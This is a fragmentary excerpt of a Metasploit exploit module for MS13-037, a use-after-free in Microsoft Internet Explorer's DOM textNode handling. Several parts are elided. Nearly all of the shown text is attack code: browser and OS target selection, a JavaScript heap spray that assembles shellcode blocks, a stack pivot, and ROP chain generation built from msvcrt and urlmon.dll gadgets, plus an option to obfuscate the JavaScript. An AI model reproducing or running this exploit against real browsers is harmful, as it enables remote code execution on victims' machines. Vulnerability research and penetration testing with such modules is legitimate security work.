...
class Metasploit3 < Msf::Exploit::Remote
	...
	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS13-037 Microsoft Internet 
Explorer textNode Use-After-Free",
			'Description'    => %q{
				This module exploits a use-after-free 
vulnerability in Microsoft Internet Explorer
				where a DOM textNode pointer becomes 
corrupted after style computation. This pointer is then overwritten when 
the innerHTML property on the parent object is set.
			...
			'Author'         =>
				[
					'Scott Bell 
<scott.bell@security-assessment.com>' # Vulnerability discovery & 
Metasploit module
				],
			'References'     =>
				[
			...
			'Payload'	  =>
				{
					...
					'DisableNops'    => true,
					'PrependEncoder' => 
"\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
...
'Rop' => :msvcrt, 'Offset' => 0x5f4 } ]
		...
		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable 
JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll 
just use that
		...
		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and 
(!nt.empty? and t.name.include?(os_name))
...
#{t.name}")
	...
	def heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, 
...
#{my_target['Offset']});
			var shellcode = offset + code + 
nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += 
shellcode;
			var block = shellcode.substring(0, 
(0x80000-6)/2);
			heap_obj.gc();
	...
	def get_payload(t, cli)
		...
		when :msvcrt
			...
			0x41414141, # Junk
			0x781a04cb # POP ECX # PUSH ESP # RETN 
[urlmon.dll]
			].pack("V*")
			...
			rop_payload = heap_foo << 
generate_rop_payload('msvcrt', "", {'pivot'=>stack_pivot, 
'target'=>'xp'})
			rop_payload << code
		end
